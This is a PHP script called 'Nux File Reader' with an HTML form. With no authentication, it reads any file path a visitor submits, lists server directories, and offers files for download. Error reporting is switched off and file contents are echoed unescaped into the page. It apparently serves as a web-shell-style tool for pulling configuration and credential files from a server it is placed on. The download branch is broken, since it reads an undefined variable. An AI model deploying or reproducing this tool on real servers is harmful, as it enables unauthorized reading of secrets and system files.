<?php /* Author : Ibnu Hadi Sumitro */
error_reporting(0);
$data['app'] = 'Nux File Reader';
$data['type'] = empty($_GET['t'])?NULL :$_GET['t'];
switch(strtolower($data['type'])):
	case 'b':
		$data['dir'] = __DIR__.(empty($_POST['file'])?NULL :$_POST['file']);
		if(is_dir($data['dir'])):
			$data['result'] = 'Browse<br>';
			if($data['dh']=opendir($data['dir'])):
				while(($data['file'] = readdir($data['dh'])) !== false):
					$data['result'] .= $data['file'] . '<br>';
				endwhile;
			closedir($data['dh']);
			endif;
		endif;
		break;
	case 'd':
		if(!empty($_POST['file'])):
			$data['result'] = 'Download<br>';
			if(file_exists($_POST['file'])):
				header('Content-Disposition: attachment; filename=' . basename($_POST['file']));
				header('Content-Length: ' . filesize($_POST['file']));
				header('Content-Type: application/octet-stream;');
				readfile($file);
			else:
				$data['result'] .= 'File Not Found';
			endif;
		endif;
		break;
	default:
		if(!empty($_POST['file'])):
			$data['result'] = 'Read<br>';
			if(file_exists($_POST['file'])):
			   $data['result'] .= file_get_contents($_POST['file']);
			else:
				$data['result'] .= 'File Not Found';
			endif;
		endif;
		break;
endswitch;
?>
<!doctype html>
<html>
<head>
	<meta charset="utf-8">
	<title><?=$data['app']?></title>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<link href="https://nuxx.000webhostapp.com/assets/styles/index.css" type="text/css" rel="stylesheet">
</head>

<body>
	<main>
		<header><h1><?=$data['app']?></h1></header>
		<section>
			<form action="" class="box" method="post" accept-charset="utf-8">
				<input type="text" name="file" value="<?=!empty($_POST['file'])?$_POST['file'] :NULL?>"<?=$data['type']=='b'?NULL :' required="required"'?> placeholder="Type here" autofocus="autofocus" />
				<button name="submit" type="submit" class="btn" ><i class="fa fa-sign-in fa-4x"></i></button>
			</form>
			<?php if(!empty($data['result'])): ?>
				<div class="box"><?=$data['result']?></div>
			<?php endif; ?>
		</section>
		<footer>&copy <?=date('Y')?> nux</footer>
	</main>
</body>
</html>